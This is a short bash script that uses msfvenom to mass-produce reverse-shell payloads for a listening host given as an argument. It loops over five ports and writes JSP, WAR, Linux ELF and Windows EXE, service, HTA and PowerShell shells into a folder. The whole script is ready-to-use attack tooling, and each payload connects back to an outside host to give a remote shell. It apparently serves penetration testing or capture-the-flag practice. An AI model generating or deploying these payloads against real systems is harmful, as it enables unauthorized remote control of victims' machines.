#!/bin/bash

LHOST=$1
LPORTS=(80 443 53 9001 9002)

rm -rf shells
mkdir shells

for LPORT in ${LPORTS[@]}; do
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shells/rev_$LPORT.jsp
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o shells/rev_$LPORT.war
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shells/rev_x64_$LPORT.elf
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shells/rev_x86_$LPORT.elf
  msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shells/rev_x86_$LPORT.exe
  msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe-service -o shells/rev_x86_service_$LPORT.exe
  msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hta-psh -o shells/rev_x86_$LPORT.hta
  msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f psh -o shells/rev_x86_$LPORT.ps1
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shells/rev_x64_$LPORT.exe
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe-service -o shells/rev_x64_service_$LPORT.exe
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hta-psh -o shells/rev_x64_$LPORT.hta
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f psh -o shells/rev_x64_$LPORT.ps1
done